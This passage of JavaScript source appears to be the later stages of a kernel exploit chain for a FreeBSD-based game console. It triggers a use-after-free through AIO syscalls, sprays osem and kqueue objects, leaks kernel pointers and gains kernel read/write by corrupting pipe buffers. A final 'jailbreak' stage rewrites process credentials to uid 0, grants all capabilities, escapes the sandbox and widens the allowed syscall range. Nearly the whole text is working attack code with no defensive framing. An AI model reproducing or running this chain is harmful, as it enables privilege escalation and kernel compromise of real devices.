        // Tier 3: if both failed, probe aio_submit_cmd (0x29D) as last AIO path
        if (!S.aioInited) {
            note("[S0-0c] Tier 3: probing aio_submit_cmd (0x" + SYS_AIO_SUBMIT_CMD.toString(16) + ")...");
            if (P.syscalls[SYS_AIO_SUBMIT_CMD] !== undefined) {
                // Probe: pass null args, just check if it's blocked or returns EINVAL
                let probeR = null;
                try {
                    probeR = await sys(SYS_AIO_SUBMIT_CMD, 0, 0, 0);
                } catch (e) {
                    note("[S0-0c] aio_submit_cmd probe threw: " + (e && e.message ? e.message : e));
                    out.why = "AIO probe hung (worker no-return on 0x29D) — bad stub or chain stall, see log";
                    return out;
                }
                note("[S0-0c] aio_submit_cmd probe ret=" + probeR.s32 + " err=" + probeR.errText);
                if (!probeR.failed || probeR.errText !== "EPERM") {
                    note("[S0-0c] aio_submit_cmd accessible (EINVAL/other expected) — AIO path may work");
                    // Don't set aioInited true here — submit_cmd has different semantics
                    // but at least AIO syscalls aren't fully blocked
                } else {
                    // submit_cmd is a DIFFERENT syscall from submit/multi_wait:
                    // its EPERM must not abort the stage. The probe + the real
                    // submit below are the ground truth (upstream v9 got EPERM
                    // on dummy multi_wait layouts = reachable, not dead).
                    note("[S0-0c] aio_submit_cmd EPERM — continuing anyway, probe + real submit decide");
                }
            } else {
                note("[S0-0c] aio_submit_cmd not in stub table — continuing, probe + real submit decide");
            }
        }
        // ── END AIO INIT ─────────────────────────────────────────────────────────

        try { await probeAioLayouts(); } catch (_) {}
        note("[S0-1] pipe (empty — reads must block)");
        const pipeBuf = safeAlloc(8, "uaf-pipe");
        if (!pipeBuf) { out.why = "uaf-pipe buffer OOM (arena exhausted)"; return out; }
        w32(pipeBuf.u8, 0, 0); w32(pipeBuf.u8, 4, 0);
        const pipeR = await sys(SYS_PIPE2, pipeBuf.base, 0);
        note("[S0-1] pipe2 ret=" + pipeR.s32 + " " + pipeR.errText);
        if (pipeR.failed) { out.why = "pipe2: " + pipeR.errText; return out; }
        S.aioRfd = r32(pipeBuf.u8, 0) | 0;
        S.aioWfd = r32(pipeBuf.u8, 4) | 0;
        track(S.aioRfd); track(S.aioWfd);
        out.steps.push("pipe r=" + S.aioRfd + " w=" + S.aioWfd);

        const num = o.numRequests || 2;
        const dataBuf = safeAlloc(64, "aio-data");
        if (!dataBuf) { out.why = "aio-data buffer OOM (arena exhausted)"; return out; }
        for (let i = 0; i < num; i++) {
            note("[S0-2." + i + "] aio_submit(req,1) fd=" + S.aioRfd);
            const sr = await submitAioRequest(S.aioRfd, dataBuf.base, 64,
                i64(0, 0));
            if (!sr.ok) {
                out.why = "submit[" + i + "]: " + sr.why;
                return out;
            }
            out.steps.push("req " + i + " id=" + sr.reqId);
        }

        note("[S0-3] aio_multi_wait(ids," + num + ",0,mode=0) — 4 args");
        const uafR = await triggerUaf(num);
        out.steps.push("multi_wait ret=" + uafR.ret);

        if (uafR.ok) {
            out.ok = true;
            note("[S0-4] UAF done — waiter array freed");
            note("writeup: reqs 0.." + (num - 2) + " dangling");
            note("writeup: waiter num=2 → 0x70 → 128 UMA zone");
        } else {
            out.why = "multi_wait: " + (uafR.why || "ret=" + uafR.ret);
        }

        flushMark("BAGAGWA-STAGE0", "ok=" + out.ok);
        return out;
    }

    async function stage1_spray(opts) {
        const o = opts || {};
        const out = { ok: false, why: "", steps: [] };

        note("=== Stage 1: osem object spray into 128-byte zone ===");

        if (!S.uafTriggered) {
            out.why = "stage 0 UAF not triggered";
            return out;
        }

        const osemStubs = [
            [SYS_OSEM_CREATE, "osem_create"],
            [SYS_OSEM_OPEN, "osem_open"],
            [SYS_OSEM_CLOSE, "osem_close"],
            [SYS_OSEM_DELETE, "osem_delete"],
        ];
        const missing = osemStubs.filter(([num]) => P.syscalls[num] === undefined);
        if (missing.length) {
            out.why = "missing osem stubs: " + missing.map(([n, l]) =>
                "0x" + n.toString(16) + " (" + l + ")").join(", ");
            return out;
        }

        const count = o.sprayCount || OSEM_SPRAY_COUNT;
        const sr = await sprayOsem(count, o.batchSize);
        out.steps.push("sprayed " + sr.count + " osem objects");

        if (!sr.ok) {
            out.why = "osem spray failed" + (sr.why ? ": " + sr.why : "");
            return out;
        }

        for (let i = 0; i < sr.count && i < 4; i++) {
            const r = await sys(SYS_OSEM_OPEN, sr.handles[i]);
            if (!r.failed) {
                out.steps.push("osem_open(" + sr.handles[i] + ") refcount incremented");
            }
        }

        out.ok = true;
        flushMark("BAGAGWA-STAGE1-DONE", "osemCount=" + sr.count);
        note("osem objects sprayed into 128-byte zone, should reclaim freed waiter array");
        return out;
    }

    async function stage2_leak(opts) {
        const o = opts || {};
        const out = { ok: false, why: "", steps: [], leaked: [] };

        note("=== Stage 2: kernel address leak ===");

        if (P.syscalls[SYS_GET_AIO_DEBUG_REQ_INFO] !== undefined) {
            note("syscall 727 (0x2D7) stub available — get_aio_debug_request_info @ 0x805c3090");
            note("OOB: source idx = (req_id>>16)+edx scaled by 0x28 into [rax+0x20]");
            for (let tIdx = 0; tIdx < LEAK_ATTEMPTS; tIdx++) {
                for (let i = 0; i < S.aioRequests.length; i++) {
                    const lr = await leakViaDebugInfo(S.aioRequests[i].id, tIdx);
                    if (lr.ok) {
                        out.leaked = out.leaked.concat(lr.leaked);
                        for (const l of lr.leaked) {
                            if (l.value) {
                                out.steps.push("leaked ptr at tIdx=" + tIdx +
                                    " off=0x" + l.offset.toString(16) +
                                    ": " + hx(l.value));
                                if (!S.targetOsemAddr && isKernelPtr(l.value) &&
                                    isAligned8(l.value)) {
                                    S.targetOsemAddr = l.value;
                                    out.steps.push("candidate osem object addr: " + hx(l.value));
                                }
                            }
                        }
                    }
                }
            }
            if (S.targetOsemAddr) {
                note("leaked candidate osem addr = " + hx(S.targetOsemAddr) +
                    " (refcount at +" + OSEM_REFCOUNT_OFF.toString(16) + " = " +
                    hx(S.targetOsemAddr.add32(OSEM_REFCOUNT_OFF)) + ")");
            }
        } else {
            note("syscall 727 (0x2D7) not in firmware profile — using pipe-based leak path");
        }

        const pr = await setupPipes();
        if (!pr.ok) { out.why = pr.why; return out; }
        out.steps.push("pipes created for kernel R/W");

        out.ok = true;
        flushMark("BAGAGWA-STAGE2-DONE", "leakedPtrs=" + out.leaked.length +
            "-targetOsem=" + hx(S.targetOsemAddr));
        return out;
    }

    async function stage3_refcount(opts) {
        const o = opts || {};
        const out = { ok: false, why: "", steps: [] };

        note("=== Stage 3: osem refcount manipulation via waker + osem_close ===");

        if (!S.uafTriggered) {
            out.why = "UAF not triggered";
            return out;
        }

        const wr = await triggerWaker(S.uafRequestIdx);
        if (wr.ok) {
            out.steps.push("waker triggered via aioWfd write: ret=" + wr.writeRet);
            out.steps.push("waker fires on dangling node (=reclaimed osem): " +
                "dec [osem+0x00]→ptr, write [osem+0x20], mtx_lock [osem+0x10]+0x18");
        } else {
            out.steps.push("waker trigger failed: " + wr.why + " — using osem_close path");
        }

        await sleep(100);

        let freedIdx = -1;
        for (let i = 0; i < S.osemHandles.length; i++) {
            const r = await sys(SYS_OSEM_POST, S.osemHandles[i]);
            if (r.failed) {
                freedIdx = i;
                out.steps.push("osem[" + i + "] (handle=" + S.osemHandles[i] +
                    ") already freed by waker's dec dword [rax] primitive");
                break;
            }
        }

        if (freedIdx < 0) {
            note("waker dec did not free osem directly, using osem_close to drain refcount");
            note("per writeup: osem_close does dec [rbx+0x54] and frees at zero");

            for (let i = 0; i < Math.min(16, S.osemHandles.length); i++) {
                const handle = S.osemHandles[i];
                const cr = await sys(SYS_OSEM_CLOSE, handle);
                if (cr.failed) continue;
                out.steps.push("osem_close(" + handle + ") decremented refcount at +0x54");

                const probe = await sys(SYS_OSEM_POST, handle);
                if (probe.failed) {
                    freedIdx = i;
                    out.steps.push("osem[" + i + "] freed — refcount reached 0 via osem_close");
                    break;
                }
            }
        }

        if (freedIdx < 0) {
            note("osem_close did not free, trying osem_delete (flag check at +0x45)");
            for (let i = 0; i < Math.min(8, S.osemHandles.length); i++) {
                const handle = S.osemHandles[i];
                const dr = await sys(SYS_OSEM_DELETE, handle);
                if (!dr.failed) {
                    freedIdx = i;
                    out.steps.push("osem[" + i + "] deleted via osem_delete " +
                        "(flag at +0x45 clear → skip refcount, straight to free)");
                    break;
                }
            }
        }

        if (freedIdx >= 0) {
            S.targetOsemIdx = freedIdx;
            out.ok = true;
            note("osem object freed at index " + freedIdx +
                " — 128-byte slab available for reclaim");
        } else {
            out.why = "could not free any osem object via refcount manipulation";
        }

        flushMark("BAGAGWA-STAGE3-DONE", "freedIdx=" + freedIdx);
        return out;
    }

    async function stage4_reclaim(opts) {
        const o = opts || {};
        const out = { ok: false, why: "", steps: [], rw: false };

        note("=== Stage 4: reclaim freed osem + establish kernel R/W ===");

        if (S.targetOsemIdx < 0 && !o.force) {
            out.why = "no freed osem object to reclaim";
            return out;
        }

        const kqBuf = alloc(4, "kqueue-fd");
        const kqFds = [];
        const KQ_SPRAY = o.kqSpray || 64;

        for (let i = 0; i < KQ_SPRAY; i++) {
            const r = await sys(SYS_KQUEUE);
            if (r.failed) continue;
            kqFds.push(r.s32);
            track(r.s32);
        }
        out.steps.push("sprayed " + kqFds.length + " kqueues for reclaim");

        const probeAddr = alloc(8, "probe-addr");
        for (let i = 0; i < kqFds.length; i++) {
            const fp = await fgetFast(kqFds[i]);
            if (fp.ret === 8 && isKernelPtr(fp.v)) {
                const fdata = await kread64Fast(fp.v.add32(OFF.FILE_F_DATA));
                if (fdata.ret === 8 && isKernelPtr(fdata.v)) {
                    const magic = await kread32Fast(fdata.v.add32(0x08));
                    if (magic.v === 0x1430000) {
                        const fdp = await kread64Fast(fdata.v.add32(0xA8));
                        if (fdp.ret === 8 && isKernelPtr(fdp.v)) {
                            S.fdOfiles = null;
                            const tbl = await kread64Fast(fdp.v.add32(OFF.FILEDESC_OFILES));
                            if (tbl.ret === 8 && isKernelPtr(tbl.v)) {
                                const hdr = await kread64Fast(tbl.v.add32(OFF.FDESCENTTBL_HDR));
                                if (hdr.ret === 8 && isKernelPtr(hdr.v)) {
                                    S.fdOfiles = hdr.v;
                                    out.steps.push("fd_ofiles = " + hx(hdr.v) +
                                        " via kqueue[" + i + "]");
                                }
                            }
                        }
                    }
                }
            }
        }

        if (!S.fdOfiles) {
            note("kqueue reclaim did not yield fd_ofiles, trying pipe-based approach");

            const cp = await findCurproc();
            if (cp.ok) {
                S.curproc = cp.curproc;
                out.steps.push("curproc = " + hx(cp.curproc) + " pid=" + cp.pid);

                const fdR = await kread64Fast(cp.curproc.add32(OFF.PROC_FD));
                if (fdR.ret === 8 && isKernelPtr(fdR.v)) {
                    const tbl = await kread64Fast(fdR.v.add32(OFF.FILEDESC_OFILES));
                    if (tbl.ret === 8 && isKernelPtr(tbl.v)) {
                        const hdr = await kread64Fast(tbl.v.add32(OFF.FDESCENTTBL_HDR));
                        if (hdr.ret === 8 && isKernelPtr(hdr.v)) {
                            S.fdOfiles = hdr.v;
                            out.steps.push("fd_ofiles = " + hx(hdr.v) + " via curproc");
                        }
                    }
                }
            }
        }

        if (S.fdOfiles) {
            const masterFp = await fgetFast(S.masterRfd);
            const victimFp = await fgetFast(S.victimRfd);
            if (isKernelPtr(masterFp.v) && isKernelPtr(victimFp.v)) {
                S.masterFp = masterFp.v;
                S.victimFp = victimFp.v;

                const mData = await kread64Fast(masterFp.v.add32(OFF.FILE_F_DATA));
                const vData = await kread64Fast(victimFp.v.add32(OFF.FILE_F_DATA));
                if (isKernelPtr(mData.v) && isKernelPtr(vData.v)) {
                    S.masterPipeData = mData.v;
                    S.victimPipeData = vData.v;

                    const pb = alloc(PIPEBUF_SIZE, "stage4-pipebuf");
                    w32(pb.u8, 0x00, 0);
                    w32(pb.u8, 0x04, 0);
                    w32(pb.u8, 0x08, 0);
                    w32(pb.u8, 0x0c, PIPE_PAGE_SIZE);
                    w64(pb.u8, 0x10, S.victimPipeData);

                    await kwriteFast(S.masterPipeData, pb, PIPEBUF_SIZE);

                    const verify = await kread64Fast(S.masterPipeData.add32(0x10));
                    if (verify.ret === 8 &&
                        verify.v.low === S.victimPipeData.low &&
                        verify.v.hi === S.victimPipeData.hi) {
                        out.rw = true;
                        out.steps.push("fast kernel R/W established via pipe corruption");
                        out.steps.push("master_pipe = " + hx(S.masterPipeData));
                        out.steps.push("victim_pipe = " + hx(S.victimPipeData));
                    }
                }
            }
        }

        for (const fd of kqFds) {
            await sys(SYS_CLOSE, fd);
            untrack(fd);
        }

        if (out.rw) {
            out.ok = true;
            flushMark("BAGAGWA-STAGE4-DONE", "rw=1-fdOfiles=" + hx(S.fdOfiles) +
                "-masterPipe=" + hx(S.masterPipeData) + "-victimPipe=" + hx(S.victimPipeData));
        } else {
            out.why = "could not establish kernel R/W";
        }
        return out;
    }

    async function stage5_jailbreak(opts) {
        const o = opts || {};
        const out = { ok: false, why: "", steps: [], before: {}, after: {} };

        note("=== Stage 5: privilege escalation & sandbox escape ===");

        if (!S.masterPipeData || !S.victimPipeData) {
            out.why = "need kernel R/W from stage 4";
            return out;
        }

        if (!S.curproc) {
            const cp = await findCurproc();
            if (!cp.ok) { out.why = "curproc: " + cp.why; return out; }
            S.curproc = cp.curproc;
        }
        out.steps.push("curproc = " + hx(S.curproc));

        const ucR = await kread64Fast(S.curproc.add32(OFF.PROC_UCRED));
        if (ucR.ret !== 8 || !isKernelPtr(ucR.v)) {
            out.why = "p_ucred = " + hx(ucR.v);
            return out;
        }
        const ucred = ucR.v;
        out.steps.push("p_ucred = " + hx(ucred));

        const fdR = await kread64Fast(S.curproc.add32(OFF.PROC_FD));
        if (fdR.ret !== 8 || !isKernelPtr(fdR.v)) {
            out.why = "p_fd = " + hx(fdR.v);
            return out;
        }
        const procFd = fdR.v;

        const uid0 = await kread32Fast(ucred.add32(OFF.UCRED_CR_UID));
        out.before.uid = uid0.v;
        out.steps.push("before: cr_uid = " + uid0.v);

        const rv = await findRootvnode();
        if (!rv.ok) { out.why = "rootvnode: " + rv.why; return out; }
        out.steps.push("rootvnode = " + hx(rv.rootvnode));

        flushMark("BAGAGWA-JAILBREAK-PRE", "curproc=" + hx(S.curproc) +
            "-ucred=" + hx(ucred) + "-uid=" + uid0.v);

        await kwrite32Fast(ucred.add32(OFF.UCRED_CR_UID), 0);
        await kwrite32Fast(ucred.add32(OFF.UCRED_CR_RUID), 0);
        await kwrite32Fast(ucred.add32(OFF.UCRED_CR_SVUID), 0);
        await kwrite32Fast(ucred.add32(OFF.UCRED_CR_NGROUPS), 1);
        await kwrite32Fast(ucred.add32(OFF.UCRED_CR_RGID), 0);
        await kwrite32Fast(ucred.add32(OFF.UCRED_CR_SVGID), 0);
        out.steps.push("cr_uid/ruid/svuid = 0, ngroups = 1, rgid/svgid = 0");

        const SYSCORE_AUTHID_LO = 0x3800000000000010 & 0xFFFFFFFF;
        const SYSCORE_AUTHID_HI = (0x3800000000000010 / 0x100000000) >>> 0;
        await kwrite64Fast(ucred.add32(OFF.UCRED_CR_SCEAUTHID),
            i64(SYSCORE_AUTHID_LO, SYSCORE_AUTHID_HI));
        await kwrite64Fast(ucred.add32(OFF.UCRED_CR_SCECAPS0),
            i64(0xFFFFFFFF, 0xFFFFFFFF));
        await kwrite64Fast(ucred.add32(OFF.UCRED_CR_SCECAPS1),
            i64(0xFFFFFFFF, 0xFFFFFFFF));
        out.steps.push("authID = SYSCORE, caps = all");

        const attrs0 = await kread64Fast(ucred.add32(OFF.UCRED_ATTRS_QWORD));
        if (attrs0.ret === 8) {
            const attrs = i64(
                ((attrs0.v.low & 0x00FFFFFF) >>> 0) | 0x80000000,
                attrs0.v.hi
            );
            await kwrite64Fast(ucred.add32(OFF.UCRED_ATTRS_QWORD), attrs);
            out.steps.push("cr_sceAttrs byte = 0x80 (RMW)");
        }

        await kwrite64Fast(procFd.add32(OFF.FD_CDIR), rv.rootvnode);
        await kwrite64Fast(procFd.add32(OFF.FD_RDIR), rv.rootvnode);
        await kwrite64Fast(procFd.add32(OFF.FD_JDIR), i64(0, 0));
        out.steps.push("fd_cdir/fd_rdir = rootvnode, fd_jdir = 0");

        const dl = await kread64Fast(S.curproc.add32(OFF.PROC_DYNLIB));
        if (dl.ret === 8 && isKernelPtr(dl.v)) {
            await kwrite64Fast(dl.v.add32(OFF.DYNLIB_SC_START), i64(0, 0));
            await kwrite64Fast(dl.v.add32(OFF.DYNLIB_SC_END),
                i64(0xFFFFFFFF, 0xFFFFFFFF));
            out.steps.push("syscall range widened");
        }

        const uid1 = await kread32Fast(ucred.add32(OFF.UCRED_CR_UID));
        out.after.uid = uid1.v;

        const gu = await sys(SYS_GETUID);
        out.after.getuid = gu.failed ? -1 : gu.s32;
        out.steps.push("after: cr_uid = " + uid1.v + ", getuid() = " + out.after.getuid);

        if (uid1.v === 0 && out.after.getuid === 0) {
            S.jailbroken = true;
            out.ok = true;
            flushMark("BAGAGWA-JAILBREAK-DONE", "uid=0-getuid=0-kernelWrites=" + S.kernelWrites);
            note("JAILBREAK COMPLETE: uid 0, sandbox escaped, full capabilities");
        } else {
            out.why = "cr_uid=" + uid1.v + " getuid()=" + out.after.getuid;
        }
        return out;
    }

    async function runAll(opts) {
        const o = opts || {};
        const results = { stages: [], ok: false };

        const s0 = await stage0_uaf(o);
        results.stages.push({ name: "stage0_uaf", ...s0 });
        if (!s0.ok) { results.why = "stage 0: " + s0.why; return results; }

        const s1 = await stage1_spray(o);
        results.stages.push({ name: "stage1_spray", ...s1 });
        if (!s1.ok) { results.why = "stage 1: " + s1.why; return results; }

        const s2 = await stage2_leak(o);
        results.stages.push({ name: "stage2_leak", ...s2 });
        if (!s2.ok) { results.why = "stage 2: " + s2.why; return results; }

        const s3 = await stage3_refcount(o);
        results.stages.push({ name: "stage3_refcount", ...s3 });
        if (!s3.ok) { results.why = "stage 3: " + s3.why; return results; }

        const s4 = await stage4_reclaim(o);
        results.stages.push({ name: "stage4_reclaim", ...s4 });
        if (!s4.ok) { results.why = "stage 4: " + s4.why; return results; }

        const s5 = await stage5_jailbreak(o);
        results.stages.push({ name: "stage5_jailbreak", ...s5 });
        if (!s5.ok) { results.why = "stage 5: " + s5.why; return results; }

        results.ok = true;
        return results;
    }

    async function cleanup() {
        const rep = { closed: 0, osemDeleted: 0 };

        for (const h of S.osemHandles) {
            const r = await sys(SYS_OSEM_DELETE, h);
            if (!r.failed) rep.osemDeleted++;
        }

        for (const req of S.aioRequests) {
            await sys(SYS_AIO_MULTI_DELETE, req.id);
        }

        const pipeFds = [S.aioRfd, S.aioWfd, S.masterRfd, S.masterWfd,
            S.victimRfd, S.victimWfd].filter(fd => fd >= 0);
        for (const fd of pipeFds) {
            await sys(SYS_CLOSE, fd);
            untrack(fd);
            rep.closed++;
        }

        flushMark("BAGAGWA-CLEANUP", "osemDeleted=" + rep.osemDeleted +
            "-fdsClosed=" + rep.closed);
        return rep;
    }

    return {
        S,
        OFF,

        submitAioRequest,
        triggerUaf,
        sprayOsem,
        leakViaDebugInfo,
        triggerWaker,
        manipulateOsemRefcount,
        setupPipes,

        kreadFast,
        kwriteFast,
        kread64Fast,
        kread32Fast,
        kwrite64Fast,
        kwrite32Fast,
        fgetFast,
        findCurproc,
        findProcByPid,
        findAllproc,
        findRootvnode,

        stage0_uaf,
        stage1_spray,
        stage2_leak,
        stage3_refcount,
        stage4_reclaim,
        stage5_jailbreak,
        runAll,
        cleanup,

        get jailbroken() { return S.jailbroken; },
        get kernelWrites() { return S.kernelWrites; },
        get uafTriggered() { return S.uafTriggered; },
    };
}
